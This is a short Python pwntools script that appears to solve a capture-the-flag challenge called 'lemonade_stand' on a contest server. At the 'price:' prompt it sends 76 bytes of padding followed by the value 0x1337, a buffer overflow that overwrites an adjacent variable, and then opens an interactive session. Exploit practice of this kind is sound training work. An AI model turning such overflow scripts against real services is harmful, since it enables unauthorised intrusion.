#!/usr/bin/env python3
from pwn import *

exe = ELF("lemonade_stand")
context.binary = exe
context.arch = "amd64"
context.os = 'linux'

HOSTNAME = 'offsec.m0lecon.it'
PORT = 13541

OFFSET_TO_TARGET = 76

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote(HOSTNAME, PORT)
    return r

def main():
    r = conn()

    payload = flat(
        b'A' * OFFSET_TO_TARGET,
        p32(0x1337)

    )

    r.recvuntil(b"price:")
    r.sendline(payload)

    r.interactive()


if __name__ == '__main__':
    main()
